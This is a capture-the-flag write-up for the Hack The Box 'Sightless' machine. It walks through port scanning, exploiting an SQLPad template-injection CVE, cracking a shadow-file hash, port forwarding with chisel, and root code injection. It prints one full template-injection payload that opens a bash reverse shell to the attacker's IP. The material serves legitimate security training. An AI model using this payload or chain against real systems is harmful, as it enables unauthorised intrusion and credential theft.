---
date: 2024-12-10
categories: [Linux, Easy]
---

![logo](https://github.com/user-attachments/assets/7392fc4b-a18b-4189-8f58-00f1536e7597)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [EmSec](https://app.hackthebox.com/users/962022)         | [Hack The Box](https://www.hackthebox.com/)     | Easy           | Linux   |

---









- I start with a scan of the open ports
    
    ```python
    nmap -p- --open -vvv --min-rate 5000 -Pn -sS 10.10.11.32 -oG scan
    ```
    
    ![image 25](https://github.com/user-attachments/assets/d24e27e8-a791-43fd-a598-47d431fcd7c4)
    
- I continue with a scan of the versions and technologies that are running on the open ports that we have found
    
    ```python
    nmap -p21,22,80 -sCV 10.10.11.32 -oN ports
    ```
    
    ![image 1 3](https://github.com/user-attachments/assets/6daf4857-2e8e-4c24-8594-2a8415111acd)
    
- I found the domain `sightless.htb` and add it to the file in the `/etc/hosts` file
    
- I look at what technologies they are using on the website.
    
    ```python
    whatweb https://sightless.htb
    ```
    
    ![image 2 2](https://github.com/user-attachments/assets/15af6568-d13f-4866-9f4b-2ba7ae6e31b1)

    
- I make a list of directories and files that end with specific extensions but I can't find anything remarkable.
    
    ![image 4 2](https://github.com/user-attachments/assets/54a8ce75-31dd-4cbe-acda-d946723f3266)

    
- I check the code of the main page and find a subdomain, add it to `/etc/hosts` and enter the web to see its content.
    
    ![image 5 1](https://github.com/user-attachments/assets/6dd1ef21-a4a5-43e1-80bb-aab3e5f3f1a5)
    
    ![image 6 1](https://github.com/user-attachments/assets/aad96827-8de9-40ee-a390-49097fb7138f)

    ![image 7 1](https://github.com/user-attachments/assets/c6d217d7-6722-4590-a36f-194c0e8b7247)

- I find a version of SQL Pad that when searching for vulnerabilities I find one that allows code execution. [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944), [Template injection](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)

- I modify the payload that shows the CVE to run a revershell and I get a shell
    
    ```bash
    {{ process.mainModule.require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.142/4444 0>&1'") }}
    ```
    
    ![image 8 1](https://github.com/user-attachments/assets/77816332-1961-4f04-a223-aa38adf8299a)
    
- When I check which user I am, I see that I am root and when I see which network I am on, I realize that I am inside a container.
    
    ![image 9 3](https://github.com/user-attachments/assets/48cf3626-ecd1-436b-a62e-cabdfcb2ea7d)
    
- When looking in the container files I see that I can read `/etc/shadow` file, which contains the encrypted user passwords.
    
    ![image 10 2](https://github.com/user-attachments/assets/6336d002-0fdd-4037-bc79-b46c6bf6b4e3)
    
- I copy one of these hashes and when I pass it through `john` I get the password of the user `michael`. Now I can connect via ssh to the system and read the first flag.
    
    ![image 11 2](https://github.com/user-attachments/assets/9a021389-1492-4898-a606-5d1e702614d0)

    ![image 12 3](https://github.com/user-attachments/assets/3cd3ac68-8dd6-4483-a369-8ac9dd35dea0)

    
- To escalate privileges I start by looking at the ports that are in use. I find 8080 which from outside the machine I am not able to see. I use chisel to send that port to my machine
    
    ![image 13 1](https://github.com/user-attachments/assets/cbdae75d-fedc-474f-824e-2314090109e1)

    
- I see a panel to log in but after several attempts I am not able to get anything
    
    ![image 14 1](https://github.com/user-attachments/assets/25006603-252c-495c-8a75-076bd134f2bb)

    
- I look at the processes running on the machine and find a few that catch my eye. After searching for information I find that they may be related to the other ports that are in use.
    
- I pass those ports to my machine with chisel and add them in chrome to be able to inspect the debugging processes.
    
    ![image 15 1](https://github.com/user-attachments/assets/2061132b-3222-421d-b116-244579bfc450)

    ![image 16 1](https://github.com/user-attachments/assets/e01be6c0-60d4-4a3c-8bba-3e8be2c1db4f)
    
- By doing this I am able to inspect the debugging of these processes
    
    ![image 17 1](https://github.com/user-attachments/assets/21f9be69-4fac-4c76-88b1-2d87fca60ea1)
    
- The process connects and disconnects from the panel continuously. When inspecting the calls we can see the credentials in plain text
    
    ![image 18 1](https://github.com/user-attachments/assets/33ea9c4d-0531-46e1-b7f1-bf534c282d1c)
    
- Using the credentials found we can log in and start investigating the site
    
    ![image 19 1](https://github.com/user-attachments/assets/c226addd-a00e-41f2-a493-80923718b2c0)
    
- After a while I find inside the PHP section a field in which I can inject code and it executes as root. I copy the flag to a directory that I can access and change the permissions. With this I am able to read the second flag

	![image 20 1](https://github.com/user-attachments/assets/0506c05e-56cb-46d3-98d3-117dafc1b70c)
	
	![image 21 1](https://github.com/user-attachments/assets/ab8d62c6-4c3b-4869-9fc2-ae9426926ac2)
